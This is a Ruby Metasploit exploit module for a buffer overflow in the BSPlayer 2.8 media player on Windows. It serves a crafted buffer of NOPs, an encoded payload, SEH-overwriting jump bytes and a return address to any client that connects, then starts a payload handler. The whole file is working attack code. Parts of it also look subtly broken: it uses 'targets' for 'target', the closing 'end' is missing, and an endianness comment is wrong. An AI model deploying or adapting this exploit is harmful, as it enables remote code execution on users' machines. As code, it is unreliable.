class MetasploitModule < Msf::Exploit::Remote
    include Msf::Exploit::Remote::TcpServer
    def initialize(info={})
        super(update_info(
            info, 'Name' => 'BSPlayer_overflow', 'Description' => 'BSPlayer 2.8 buffer overflow',
            'Author' => 'DAVID', 'Platform' => 'win', 'Targets' => [['Generic', {'Ret' => 0x0000583b, 'Offset' => 2048}]],
            'Payload' => {'Space' => 2000, 'BadChars' => '\x00\x0a\x20\x0d'}
        ))
    end

    def on_client_connect(client)
        return if( (p = regenerate_payload(client)) == nil )
        print_status("Client connected")
        sploit = make_nops(targets['Offset'])
        sploit << payload.encoded
        sploit << make_nops(6787 - 2048 - payload.encoded.length)
        sploit << '\xe9\x85\xe9\xff\xff' # long jmp to the payload, overwrites the 
        nseh = '\xeb\xf9\x90\x90' # overwrites the next SEH frame pointer to the long jmp
        sploit << nseh
        sploit << [target.ret].pack('V') # change to big endian format for data networking
        client.put(sploit)
        client.get_once
        client.put(sploit)
        handler(client)
        service.close_client(client)
    end